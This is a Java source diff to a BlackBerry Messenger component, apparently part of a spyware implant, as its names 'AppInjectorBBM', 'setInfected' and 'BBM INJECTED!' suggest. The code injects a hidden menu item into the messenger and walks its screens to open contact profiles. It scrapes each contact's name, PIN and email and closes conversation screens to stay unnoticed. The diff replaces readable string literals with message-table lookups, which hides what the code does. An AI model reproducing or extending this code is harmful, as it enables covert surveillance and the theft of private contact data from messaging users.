@@ -17,6 +17,7 @@ import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Messages;
 import blackberry.Singleton;
 import blackberry.Status;
 import blackberry.debug.Debug;
@@ -27,9 +28,9 @@ import blackberry.interfaces.iSingleton;
 import blackberry.utils.Utils;
 
 public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
-    private static String BBM_MENU = "Yield Menu";
+    private static String BBM_MENU = Messages.getString("1j.0"); //$NON-NLS-1$
     //#ifdef DEBUG
-    private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     UiApplication bbmApplication;
@@ -71,7 +72,7 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
 
     public void checkForConversationScreen() {
         //#ifdef DEBUG
-        debug.trace("checkForConversationScreen");
+        debug.trace("checkForConversationScreen"); //$NON-NLS-1$
         //#endif
         conversationScreen.getConversationScreen();
     }
@@ -86,21 +87,21 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
 
             if (bbmInjected) {
                 //#ifdef DEBUG
-                debug.trace("run: already injected");
+                debug.trace("run: already injected"); //$NON-NLS-1$
                 //#endif
                 return null;
             }
 
             //#ifdef DEBUG
             debug.init();
-            debug.info("BBMMenuItem context: " + context);
+            debug.info("BBMMenuItem context: " + context); //$NON-NLS-1$
             //#endif
 
             UiApplication app = UiApplication.getUiApplication();
             Class cl = app.getClass();
 
             //#ifdef DEBUG
-            debug.trace("class: " + cl);
+            debug.trace("class: " + cl); //$NON-NLS-1$
             //#endif
 
             checkScreen(3);
@@ -109,7 +110,7 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
 
         } catch (Exception ex) {
             //#ifdef DEBUG
-            debug.warn("injectBBM:" + ex.toString());
+            debug.warn(Messages.getString("1j.6") + ex.toString()); //$NON-NLS-1$
             //#endif
 
             if (Status.self().wantLight()) {
@@ -124,21 +125,21 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
         Screen screen = UiApplication.getUiApplication().getActiveScreen();
         if (tries <= 0) {
             //#ifdef DEBUG
-            debug.trace("checkScreen: no more tries");
+            debug.trace("checkScreen: no more tries"); //$NON-NLS-1$
             //#endif
             return;
         }
 
         //#ifdef DEBUG
-        debug.trace("screen: " + screen + " count: "
+        debug.trace("screen: " + screen + " count: " //$NON-NLS-1$ //$NON-NLS-2$
                 + screen.getUiEngine().getScreenCount());
         //#endif
 
         //debug.startBuffering(EventLogger.INFORMATION);
         //#ifdef DEBUG
-        debug.trace("run: " + screen.getClass().getName());
+        debug.trace("run: " + screen.getClass().getName()); //$NON-NLS-1$
         //#endif
-        if (screen.getClass().getName().indexOf("ContactsScreen") > 0) {
+        if (screen.getClass().getName().indexOf(Messages.getString("1j.11")) > 0) { //$NON-NLS-1$
             contacts.removeAllElements();
 
             contactsScreen = screen;
@@ -156,7 +157,7 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
             conversationScreen.setBBM(bbmApplication);
 
             //#ifdef DEBUG
-            debug.info("BBM INJECTED!");
+            debug.info("BBM INJECTED!"); //$NON-NLS-1$
             //#endif
 
             if (Status.self().wantLight()) {
@@ -165,16 +166,16 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
 
             AppInjectorBBM.getInstance().setInfected(true);
 
-        } else if (screen.getClass().getName().indexOf("ConversationScreen") > 0) {
+        } else if (screen.getClass().getName().indexOf(Messages.getString("1j.13")) > 0) { //$NON-NLS-1$
             //#ifdef DEBUG
-            debug.info("checkScreen: Conversation, closing");
+            debug.info("checkScreen: Conversation, closing"); //$NON-NLS-1$
             //#endif
             screen.close();
             checkScreen(tries - 1);
         } else {
             //#ifdef DEBUG
 
-            debug.warn("BBM NOT INJECTED!");
+            debug.warn("BBM NOT INJECTED!"); //$NON-NLS-1$
             //#endif
 
             if (Status.self().isDemo()) {
@@ -185,25 +186,25 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
 
     private synchronized boolean extractProfile(Screen screen) {
         //#ifdef DEBUG
-        debug.trace("extractProfile");
-        debug.trace("  local active screen: "
+        debug.trace("extractProfile"); //$NON-NLS-1$
+        debug.trace("  local active screen: " //$NON-NLS-1$
                 + UiApplication.getUiApplication().getActiveScreen());
         //#endif
 
         try {
-            if (MenuWalker.walk("View Contact Profile", screen, true)
-                    || MenuWalker.walk("Contact Profile", screen, true)) {
+            if (MenuWalker.walk(Messages.getString("1j.2"), screen, true) //$NON-NLS-1$
+                    || MenuWalker.walk(Messages.getString("1j.1"), screen, true)) { //$NON-NLS-1$
                 //#ifdef DEBUG
-                Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
-                debug.info("walked in Contact Profile");
+                Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE); //$NON-NLS-1$
+                debug.info("walked in Contact Profile"); //$NON-NLS-1$
                 //#endif
                 Utils.sleep(100);
                 Screen newScreen = UiApplication.getUiApplication()
                         .getActiveScreen();
 
-                if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
+                if (newScreen.getClass().getName().indexOf(Messages.getString("1j.3")) < 0) { //$NON-NLS-1$
                     //#ifdef DEBUG
-                    debug.trace("no Contact Profile: " + newScreen);
+                    debug.trace("no Contact Profile: " + newScreen); //$NON-NLS-1$
                     //#endif
                     return false;
                 }
@@ -214,7 +215,7 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
                 // + UiApplication.getUiApplication().getActiveScreen());
 
                 //#ifdef DEBUG
-                debug.trace("exploring Contact Profile: " + newScreen);
+                debug.trace("exploring Contact Profile: " + newScreen); //$NON-NLS-1$
                 //#endif
 
                 FieldExplorer explorer = new FieldExplorer();
@@ -223,17 +224,17 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
                 if (textfields.size() == 2 || textfields.size() == 3) {
                     String user = (String) textfields.elementAt(0);
                     String pin = (String) textfields.elementAt(1);
-                    String email = "";
+                    String email = ""; //$NON-NLS-1$
 
                     //#ifdef DEBUG
-                    debug.info("User: " + user);
-                    debug.info("PIN: " + pin);
+                    debug.info("User: " + user); //$NON-NLS-1$
+                    debug.info("PIN: " + pin); //$NON-NLS-1$
                     //#endif
 
                     if (textfields.size() == 3) {
                         email = (String) textfields.elementAt(2);
                         //#ifdef DEBUG
-                        debug.info("Email: " + email);
+                        debug.info("Email: " + email); //$NON-NLS-1$
                         //#endif
                     }
 
@@ -244,12 +245,12 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
                     }
                 }
                 //#ifdef DEBUG
-                debug.trace("closing Contact Profile");
+                debug.trace("closing Contact Profile"); //$NON-NLS-1$
                 //#endif
                 newScreen.close();
             } else {
                 //#ifdef DEBUG
-                debug.info("");
+                debug.info(""); //$NON-NLS-1$
                 //#endif
             }
 
@@ -272,7 +273,7 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
     public synchronized void addMenuBBM() {
         if (!menuAdded) {
             //#ifdef DEBUG
-            debug.trace("addMenuBBM: " + toString());
+            debug.trace("addMenuBBM: " + toString()); //$NON-NLS-1$
             //#endif
 
             long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
@@ -285,7 +286,7 @@ public class BBMMenuItem extends ApplicationMenuItem implements iSingleton {
     public synchronized void removeMenuBBM() {
         if (menuAdded) {
             //#ifdef DEBUG
-            debug.trace("removeMenuBBM");
+            debug.trace("removeMenuBBM"); //$NON-NLS-1$
             //#endif
             long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
             ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid,
